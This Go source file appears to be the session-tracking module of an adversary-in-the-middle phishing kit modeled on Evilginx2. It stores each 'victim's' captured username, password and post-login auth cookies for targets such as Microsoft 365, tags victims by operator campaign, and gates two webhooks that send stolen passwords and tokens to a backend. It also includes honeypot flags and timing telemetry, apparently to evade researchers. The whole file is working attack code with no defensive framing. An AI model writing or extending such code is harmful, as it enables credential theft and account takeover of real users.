package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"sync"
	"time"
)

// ══════════════════════════════════════════════════════════
//  FIXED-SIZE SLIDING WINDOW (Zero-Allocation Telemetry)
//  Tracks behavioral metrics over a rolling 60-second window
//  without triggering the Go Garbage Collector.
// ══════════════════════════════════════════════════════════

const (
	bucketCount   = 12   // 12 buckets
	bucketWidthMS = 5000 // 5 seconds per bucket = 60 seconds total window
)

// RequestBucket holds aggregated stats for a 5-second window.
// Using primitive types (uint32, uint16) keeps the memory footprint tiny (24 bytes).
type RequestBucket struct {
	Epoch        int64  // The time window this bucket represents (nowMS / bucketWidthMS)
	RequestCount uint32 // Total requests in this 5s window
	ErrorCount   uint16 // Total 4xx/5xx responses in this window
	PathHash     uint64 // Hash of the most recent path (to detect rapid traversal)
}

// RequestWindow is a FIXED-SIZE array. It never allocates new memory on the heap.
type RequestWindow struct {
	Buckets [bucketCount]RequestBucket
}

// Add records a request into the correct time bucket, overwriting old data.
func (w *RequestWindow) Add(nowMS int64, pathHash uint64, isError bool) {
	// 1. Calculate which bucket this moment in time belongs to (0 to 11)
	epoch := nowMS / bucketWidthMS
	index := int(epoch % bucketCount)

	bucket := &w.Buckets[index]

	// 2. If this is a new time window, reset the bucket's counters
	if bucket.Epoch != epoch {
		bucket.Epoch = epoch
		bucket.RequestCount = 0
		bucket.ErrorCount = 0
		bucket.PathHash = 0
	}

	// 3. Increment counters (with overflow protection)
	if bucket.RequestCount < ^uint32(0) {
		bucket.RequestCount++
	}
	if isError && bucket.ErrorCount < ^uint16(0) {
		bucket.ErrorCount++
	}

	// 4. Update the path hash
	bucket.PathHash = pathHash
}

// GetWindowStats sums up the last 60 seconds of activity.
func (w *RequestWindow) GetWindowStats(nowMS int64) (reqCount uint32, errCount uint16, uniquePaths uint8) {
	currentEpoch := nowMS / bucketWidthMS

	for i := 0; i < bucketCount; i++ {
		bucket := &w.Buckets[i]
		// Only count buckets that are within the last 60 seconds
		if currentEpoch-bucket.Epoch < bucketCount {
			reqCount += bucket.RequestCount
			errCount += bucket.ErrorCount
			if bucket.PathHash != 0 {
				uniquePaths++ // Simplified unique path counter
			}
		}
	}
	return reqCount, errCount, uniquePaths
}

// ══════════════════════════════════════════════════════════
//  SESSION TRACKING
//  Each victim gets a unique session tracked by cookie.
//  Sessions store credentials, tokens, and target info.
// ══════════════════════════════════════════════════════════

type Session struct {
	mu                  sync.Mutex // guards the mutable fields below (concurrent capture paths)
	ID                  string
	Index               int
	IP                  string
	UserAgent           string
	Username            string
	Password            string
	Domain              string
	TargetName          string // which target this session belongs to (e.g. "Microsoft 365")
	CampaignID          string // multi-tenancy: which operator campaign this victim came from (?cid=)
	CreatedAt           time.Time
	LandingPageServedAt time.Time // NEW: Used for the "Human Pulse" timing heuristic
	IsDone              bool
	ReachedService      bool              // set when the post-login chain reaches target.ServiceUpstream
	PasswordSent        bool              // Event 1 (immediate password capture) webhook fired at least once
	sentPassword        string            // last password sent in Event 1 — lets a retry overwrite a wrong password
	CompleteSent        bool              // Event 2 (full capture w/ tokens) webhook already fired
	CookieTokens        map[string]string // auth cookies/tokens captured after login
	IsHoneypot          bool              // NEW: Flags this session as a counter-intelligence trap

	// ── NEW: Behavioral Telemetry ──
	ActivityWindow RequestWindow // Tracks the last 60 seconds of behavior (zero allocation)
}

// ── Thread-safe accessors (use these instead of direct field writes) ──

// SetCampaignID records the campaign (tenant) once, from the first ?cid= request.
func (s *Session) SetCampaignID(cid string) {
	if cid == "" {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CampaignID == "" {
		s.CampaignID = cid
	}
}

// SetCredentials records a captured username/password (body parser OR DOM hook).
func (s *Session) SetCredentials(username, password string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if username != "" {
		s.Username = username
	}
	if password != "" {
		s.Password = password
	}
}

// AddToken records a captured session cookie/token.
func (s *Session) AddToken(name, value string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CookieTokens == nil {
		s.CookieTokens = make(map[string]string)
	}
	s.CookieTokens[name] = value
}

// SetLandingPageServedAt records the exact time the landing page was served to this session.
// This is used later by the "Human Pulse" timing heuristic in capture.go.
func (s *Session) SetLandingPageServedAt() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.LandingPageServedAt = time.Now()
}

// GetLandingPageServedAt returns the time the landing page was served.
func (s *Session) GetLandingPageServedAt() time.Time {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.LandingPageServedAt
}

// ── Two-event webhook gates ──
//
// Event 1 — the moment a password is captured (DOM hook or body parser), fire a
//   webhook so the credential is recorded even if the victim abandons the login.
//   It fires the FIRST time, and AGAIN whenever the captured password CHANGES —
//   so a victim who mistypes then retries overwrites the wrong password in the
//   backend (which upserts by sessionId). Repeated captures of the SAME password
//   (the DOM hook fires several times per submit) are deduped.
// Event 2 — when the login completes and the auth cookies land (saveTokens), fire
//   a second webhook carrying the tokens + isDone.

// ShouldEmitPassword gates Event 1. Pass the just-captured password: it returns
// true the first time, and again only if the password differs from the last one
// emitted (a retry), so the backend record is corrected rather than left stale.
func (s *Session) ShouldEmitPassword(password string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if password == "" {
		return false
	}
	if s.PasswordSent && s.sentPassword == password {
		return false // same password already sent — dedupe the DOM hook's repeat fires
	}
	s.PasswordSent = true
	s.sentPassword = password
	return true
}

// ShouldEmitComplete returns true only once — gates Event 2 (full capture with
// tokens, fired from saveTokens on session completion).
func (s *Session) ShouldEmitComplete() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CompleteSent {
		return false
	}
	s.CompleteSent = true
	return true
}

// Snapshot returns a consistent copy of the key fields for logging/webhooks.
func (s *Session) Snapshot() (username, password, campaignID string, tokens map[string]string, done bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	tokens = make(map[string]string, len(s.CookieTokens))
	for k, v := range s.CookieTokens {
		tokens[k] = v
	}
	return s.Username, s.Password, s.CampaignID, tokens, s.IsDone
}

type SessionManager struct {
	mu         sync.Mutex
	sessions   map[string]*Session
	byIndex    map[int]*Session
	nextID     int
	cookieName string
}

var sessionMgr *SessionManager

func initSessionManager() {
	// Generate random cookie name per run (like Evilginx2)
	b := make([]byte, 4)
	rand.Read(b)

	sessionMgr = &SessionManager{
		sessions:   make(map[string]*Session),
		byIndex:    make(map[int]*Session),
		nextID:     0,
		cookieName: fmt.Sprintf("_%s", hex.EncodeToString(b)),
	}
}

func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	// Check for existing session cookie
	cookie, err := r.Cookie(sm.cookieName)
	if err == nil {
		if s, ok := sm.sessions[cookie.Value]; ok {
			return s
		}
	}

	// Create new session
	id := sm.generateID()
	idx := sm.nextID
	sm.nextID++

	s := &Session{
		ID:             id,
		Index:          idx,
		IP:             extractIP(r),
		UserAgent:      r.UserAgent(),
		Domain:         domain,
		CreatedAt:      time.Now(),
		CookieTokens:   make(map[string]string),
		ActivityWindow: RequestWindow{}, // Initialized with zero-value (empty buckets)
	}

	sm.sessions[id] = s
	sm.byIndex[idx] = s

	ua := s.UserAgent
	if len(ua) > 50 {
		ua = ua[:50]
	}
	fmt.Printf("[+] [%d] New session: %s (%s) from %s\n",
		idx, s.ID[:8], ua, s.IP)

	return s
}

func (sm *SessionManager) generateID() string {
	b := make([]byte, 16)
	rand.Read(b)
	hash := sha256.Sum256(b)
	return hex.EncodeToString(hash[:])
}

// ══════════════════════════════════════════════════════════
//  IP EXTRACTION
// ══════════════════════════════════════════════════════════

func extractIP(r *http.Request) string {
	// Check Cloudflare headers first
	if ip := r.Header.Get("Cf-Connecting-Ip"); ip != "" {
		return ip
	}
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return ip
	}
	// Fall back to RemoteAddr (strip port)
	host := r.RemoteAddr
	for i := len(host) - 1; i >= 0; i-- {
		if host[i] == ':' {
			return host[:i]
		}
	}
	return host
}
